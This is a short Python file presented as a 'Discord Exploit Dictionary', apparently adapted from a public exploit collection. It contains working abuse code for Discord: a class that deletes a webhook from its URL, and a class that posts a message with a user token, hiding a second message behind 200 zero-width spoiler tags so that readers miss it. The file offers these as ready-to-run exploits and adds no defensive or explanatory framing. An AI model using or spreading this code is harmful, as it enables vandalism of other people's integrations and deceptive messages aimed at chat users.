# Discord Exploit Dictionary 2021
# Exploits from cs (checksum) : https://github.com/ecriminal/Discord-Exploit-Collection

import requests

class Exploits:
    class apiabuse:
        class DeleteWebhook:
            def __init__(self, url):
                self.url = url

            def execute(self):
                requests.delete(self.url)

    class render:
        class MaskMSG:
            def __init__(self, token, channel, message, hidden_message):
                self.token = token
                self.channel_id = channel
                self.message = message
                self.hidden_message = hidden_message
                self.headers = {'Authorization': token}

            def generateMessage(self, m1, m2):
                return m1 + ('||\u200b||' * 200) + m2

            def execute(self):
                requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': self.generateMessage(self.message, self.hidden_message)})
